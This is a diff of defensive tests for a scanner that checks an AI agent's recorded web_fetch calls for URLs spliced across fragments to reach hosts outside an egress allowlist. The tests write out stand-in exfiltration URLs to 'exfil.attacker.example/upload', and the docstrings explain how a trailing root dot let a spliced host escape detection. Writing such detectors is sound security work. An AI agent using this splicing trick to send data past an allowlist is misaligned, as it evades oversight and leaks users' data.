@@ -93,3 +93,34 @@ def test_a_backslash_cannot_make_a_spliced_url_look_allowlisted(tmp_path: Path) 
         {"tool": "web_fetch", "arguments": {"url": "example\\@docs.example.com/upload"}},
     ]}), encoding="utf-8")
     assert _ids(root) == [RULE]
+
+
+def _splice(root: Path, *fragments: str, allowlist: str = "") -> list[str]:
+    if allowlist:
+        (root / ".aak").mkdir(parents=True)
+        (root / ".aak" / "composition-boundaries.yaml").write_text(
+            f"egress_allowlist: [{allowlist}]\n", encoding="utf-8",
+        )
+    root.mkdir(parents=True, exist_ok=True)
+    (root / "run.session.json").write_text(json.dumps({"calls": [
+        {"tool": "web_fetch", "arguments": {"url": fragment}} for fragment in fragments
+    ]}), encoding="utf-8")
+    return _ids(root)
+
+
+def test_a_spliced_url_ending_in_a_root_dot_is_judged_by_its_host(tmp_path: Path) -> None:
+    """`attacker.example.` is the fully qualified spelling of attacker.example,
+    and a client connects to the same host. A reassembled URL whose host ended
+    in a dot was skipped, so a splice could finish its host with one."""
+    assert _splice(tmp_path / "a", "https://exfil.attacker", ".example./upload") == [RULE]
+    assert _splice(tmp_path / "b", "https://exfil.attacker", ".example.") == [RULE]
+
+
+def test_a_root_dot_does_not_take_a_host_off_the_allowlist(tmp_path: Path) -> None:
+    root = tmp_path / "proj"
+    assert _splice(root, "https://docs.", "example.com./guide", allowlist="docs.example.com") == []
+
+
+def test_a_fragment_that_names_the_host_with_a_root_dot_is_no_splice(tmp_path: Path) -> None:
+    """One call already asked for attacker.example: the second only adds a path."""
+    assert _splice(tmp_path / "proj", "https://attacker.example.", "/upload") == []
